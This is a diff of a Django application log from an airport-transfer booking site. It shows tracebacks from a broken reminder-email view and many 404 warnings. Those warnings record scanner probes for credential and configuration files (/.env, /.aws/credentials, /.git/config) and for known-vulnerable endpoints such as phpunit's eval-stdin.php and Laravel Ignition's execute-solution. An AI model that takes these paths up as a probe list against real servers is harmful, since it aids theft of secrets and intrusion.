-TypeError: sending_reminder_email() missing 1 required positional argument: 'user'
-ERROR 2023-10-03 12:29:53,077 log Internal Server Error: /reminder_detail/
-Traceback (most recent call last):
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/exception.py", line 56, in inner
-    response = get_response(request)
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/base.py", line 197, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/home/ubuntu/github/easygo/basecamp/views.py", line 1775, in reminder_detail
-    user1 = Post.objects.filter(email=email)[1]
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/db/models/query.py", line 362, in __getitem__
-    return qs._result_cache[0]
-IndexError: list index out of range
-WARNING 2023-10-03 12:50:20,082 log Not Found: /airport-transfers-leichardt/
-WARNING 2023-10-03 12:52:27,128 log Not Found: /Core/Skin/Login.aspx
-WARNING 2023-10-03 12:57:44,743 log Not Found: /home
-ERROR 2023-10-03 13:01:20,799 log Internal Server Error: /reminder_detail/
-Traceback (most recent call last):
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/exception.py", line 56, in inner
-    response = get_response(request)
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/base.py", line 197, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/home/ubuntu/github/easygo/basecamp/views.py", line 1776, in reminder_detail
-    if user.return_pickup_time =='x':
-AttributeError: 'QuerySet' object has no attribute 'return_pickup_time'
-ERROR 2023-10-03 13:02:16,056 log Internal Server Error: /reminder_detail/
-Traceback (most recent call last):
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/exception.py", line 56, in inner
-    response = get_response(request)
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/base.py", line 197, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/home/ubuntu/github/easygo/basecamp/views.py", line 1776, in reminder_detail
-    if user.return_pickup_time =='x':
-AttributeError: 'QuerySet' object has no attribute 'return_pickup_time'
-ERROR 2023-10-03 13:03:06,595 log Internal Server Error: /reminder_detail/
-Traceback (most recent call last):
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/exception.py", line 56, in inner
-    response = get_response(request)
-  File "/home/ubuntu/github/easygo/venv/lib/python3.10/site-packages/django/core/handlers/base.py", line 197, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/home/ubuntu/github/easygo/basecamp/views.py", line 1776, in reminder_detail
-    if user.return_pickup_time =='x':
-AttributeError: 'QuerySet' object has no attribute 'return_pickup_time'
-WARNING 2023-10-03 13:45:40,437 log Not Found: /robots.txt
-WARNING 2023-10-03 13:47:13,583 log Not Found: /php.ini
-WARNING 2023-10-03 13:56:01,292 log Not Found: //.env
-WARNING 2023-10-03 14:03:09,615 log Not Found: /owa/auth/x.js
-WARNING 2023-10-03 14:04:28,720 log Not Found: /shop/product/moncler-jackets-men-leblond-khaki/
-WARNING 2023-10-03 14:11:53,059 log Forbidden (Referer checking failed - no Referer.): /
-WARNING 2023-10-03 14:20:38,222 log Not Found: /robots.txt
-WARNING 2023-10-03 14:22:50,631 log Not Found: /.env
-WARNING 2023-10-03 14:22:52,969 log Forbidden (Referer checking failed - no Referer.): /
-WARNING 2023-10-03 14:25:30,645 log Not Found: /Core/Skin/Login.aspx
-WARNING 2023-10-03 14:27:13,680 log Not Found: /robots.txt
-WARNING 2023-10-03 14:35:30,597 log Not Found: /config.env.js
-WARNING 2023-10-03 14:36:24,980 log Not Found: /.well-known/acme-challenge/03VRZY8JOWWPPA1DX5Y6-IE4J6Q8BCGO
-WARNING 2023-10-03 14:36:26,028 log Not Found: /.well-known/acme-challenge/K3A1O9H91F-GH3EABAHO7IPBBE9JT4M_
-WARNING 2023-10-03 14:39:11,220 log Not Found: /remote/login
-WARNING 2023-10-03 14:39:20,013 log Not Found: /favicon/favicon.ico
-WARNING 2023-10-03 14:44:22,067 log Not Found: /robots.txt
-WARNING 2023-10-03 14:52:02,781 log Not Found: /.env
-WARNING 2023-10-03 14:55:30,016 log Not Found: /apple-touch-icon.png
-WARNING 2023-10-03 14:55:30,864 log Not Found: /apple-touch-icon.png
-WARNING 2023-10-03 14:55:40,256 log Not Found: /apple-touch-icon.png
-WARNING 2023-10-03 14:56:12,850 log Not Found: /apple-touch-icon.png
-WARNING 2023-10-03 15:05:59,826 log Not Found: /robots.txt
-WARNING 2023-10-03 15:11:25,793 log Not Found: /ko/product/moncler-down-coat-men-중간-길이-후드-커피/
-WARNING 2023-10-03 15:41:17,682 log Not Found: /wp-content/plugins/aviary-image-editor-add-on-for-gravity-forms/includes/upload.php
-WARNING 2023-10-03 15:58:33,662 log Not Found: /contact/
-WARNING 2023-10-03 15:58:37,905 log Not Found: /Core/Skin/Login.aspx
-WARNING 2023-10-03 16:12:08,440 log Not Found: /robots.txt
-WARNING 2023-10-03 16:16:58,805 log Not Found: /robots.txt
-WARNING 2023-10-03 16:21:59,058 log Not Found: /shop/nl/product/goedkope-moncler-neer-mouwloze-vest-vrouwen-zip-zwart/
-WARNING 2023-10-03 17:06:17,197 log Not Found: /robots.txt
-WARNING 2023-10-03 17:15:52,261 log Not Found: /.aws/credentials
-WARNING 2023-10-03 17:15:54,027 log Not Found: /.env
-WARNING 2023-10-03 17:15:55,830 log Not Found: /.env.bak
-WARNING 2023-10-03 17:15:57,211 log Not Found: /dashboard/phpinfo.php
-WARNING 2023-10-03 17:15:58,951 log Not Found: /_profiler/phpinfo
-WARNING 2023-10-03 17:16:00,428 log Not Found: /_wpeprivate/config.json
-WARNING 2023-10-03 17:16:05,134 log Not Found: /api/.env
-WARNING 2023-10-03 17:16:06,669 log Not Found: /aws.yml
-WARNING 2023-10-03 17:16:08,327 log Not Found: /config.js
-WARNING 2023-10-03 17:16:09,839 log Not Found: /config/aws.yml
-WARNING 2023-10-03 17:16:11,299 log Not Found: /info.json
-WARNING 2023-10-03 17:16:13,035 log Not Found: /info.php
-WARNING 2023-10-03 17:16:14,683 log Not Found: /laravel/.env
-WARNING 2023-10-03 17:16:16,704 log Not Found: /php-info
-WARNING 2023-10-03 17:16:18,530 log Not Found: /phpinfo
-WARNING 2023-10-03 17:16:20,020 log Not Found: /phpinfo.php
-WARNING 2023-10-03 17:16:21,648 log Not Found: /test.php
-WARNING 2023-10-03 17:16:37,821 log Not Found: /apple-touch-icon-120x120-precomposed.png
-WARNING 2023-10-03 17:16:37,898 log Not Found: /apple-touch-icon-120x120.png
-WARNING 2023-10-03 17:31:59,715 log Not Found: /Core/Skin/Login.aspx
-WARNING 2023-10-03 17:44:37,016 log Not Found: /.well-known/traffic-advice
-WARNING 2023-10-03 17:48:33,151 log Not Found: /robots.txt
-WARNING 2023-10-03 17:52:54,881 log Not Found: /shop/ko/product-category/스님-레일/
-WARNING 2023-10-03 18:17:18,002 log Forbidden (CSRF cookie not set.): /booking_form_detail/
-WARNING 2023-10-03 18:30:36,715 log Not Found: /shop/nl/product/moncler-bady-9/
-WARNING 2023-10-03 18:32:19,307 log Not Found: /contact-us/
-WARNING 2023-10-03 18:39:49,999 log Not Found: /.env
-WARNING 2023-10-03 18:39:51,379 log Forbidden (Referer checking failed - no Referer.): /
-WARNING 2023-10-03 18:46:06,341 log Not Found: /robots.txt
-WARNING 2023-10-03 18:52:37,982 log Not Found: /Autodiscover/Autodiscover.xml
-WARNING 2023-10-03 19:01:56,477 log Not Found: /.git/config
-WARNING 2023-10-03 19:03:14,537 log Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
-WARNING 2023-10-03 19:05:13,546 log Not Found: /Core/Skin/Login.aspx
-WARNING 2023-10-03 19:09:00,352 log Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
-WARNING 2023-10-03 19:16:27,898 log Not Found: /solr/admin/info/system
-WARNING 2023-10-03 19:27:52,484 log Not Found: /shop/es/product/moncler-venta-bolsos-en-negro/
-WARNING 2023-10-03 19:41:18,537 log Not Found: /wp-content/uploads.php
-WARNING 2023-10-03 19:52:35,620 log Not Found: /.well-known/traffic-advice
-WARNING 2023-10-03 20:12:34,852 log Not Found: /console/
-WARNING 2023-10-03 20:15:40,758 log Not Found: /_ignition/execute-solution
-WARNING 2023-10-03 20:16:40,083 log Not Found: /robots.txt
-WARNING 2023-10-03 20:27:43,091 log Not Found: /.env
-WARNING 2023-10-03 20:27:44,638 log Forbidden (Referer checking failed - no Referer.): /
+  File "/home/ubuntu/github/easygo/basecamp/views.py", line 1786, in reminder_detail
+    sending_reminder_email(user)
+  File "/home/ubuntu/github/easygo/basecamp/views.py", line 1754, in sending_reminder_email
+    {{'name': user.name, 'flight_date': user.flight_date, 'flight_number': user.flight_number,
+TypeError: unhashable type: 'dict'
+WARNING 2023-10-04 10:03:38,086 log Not Found: /apple-touch-icon-120x120-precomposed.png
+WARNING 2023-10-04 10:03:38,141 log Not Found: /apple-touch-icon-120x120.png
